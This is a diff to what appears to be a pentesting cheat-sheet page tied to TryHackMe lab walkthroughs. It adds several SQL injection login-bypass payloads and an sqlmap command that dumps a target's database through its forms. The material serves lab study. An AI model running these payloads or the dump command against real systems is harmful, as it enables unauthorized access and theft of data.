@@ -8,9 +8,15 @@
 
 ### **SQL Injection**
 
+**Examples**
+
+[sql-injection-lab.md](../../walkthroughs/tryhackme/sql-injection-lab.md "mention")[#sql-injection](../../walkthroughs/tryhackme/avengers-blog.md#sql-injection "mention")
+
 ```
 a' or 1=1 -- -
-
+1 or 1=1-- -
+1' or '1'='1'-- -
+' or 1=1--
 ```
 
 
@@ -64,6 +70,18 @@ ls /SecLists/Discovery/Web-Content/common.txt
 <figure><img src="../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 
+
+### SQLMap
+
+**Examples**
+
+[#sql](../../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")
+
+**Kali**
+
+```
+sqlmap -u http://$VICTIM/administrator.php --forms --dump
+```
 
 
 
